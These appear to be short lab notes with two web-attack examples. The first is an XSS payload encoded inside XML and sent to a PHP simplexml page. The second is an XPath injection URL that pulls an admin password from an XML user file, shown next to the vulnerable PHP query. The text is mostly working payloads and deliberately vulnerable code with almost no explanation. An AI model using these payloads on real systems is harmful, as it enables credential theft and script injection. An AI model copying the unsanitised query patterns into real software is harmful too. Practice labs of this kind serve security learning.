#### Example 1

Payload:
```
$target/example1.php?xml=<test>%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B</test>
```

Code:
```php
$xml=simplexml_load_string($_GET['xml']);
print_r((string)$xml);
```

#### Example 2

Payload:
```
http://172.16.224.183/xml/example2.php?name=admin']/parent::*/password%00
```

Code:
```php
$xml = simplexml_load_file(dirname(__FILE__) . '/tmp/x.xml');
$xpath = "users/user/name[.='".$_GET['name']."']/parent::*/message";
$res = ($xml->xpath($xpath));
while(list( ,$node) = each($res)) { echo $node; }
```

File: `/tmp/x.xml`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<data>
   <users>
      <user>
         <name>user</name>
         <message>Hello user</message>
         <password>user123</password>
      </user>
      <user>
         <name>admin</name>
         <message>Hello admin</message>
         <password>1337p@ssword</password>
      </user>
   </users>
</data>
```
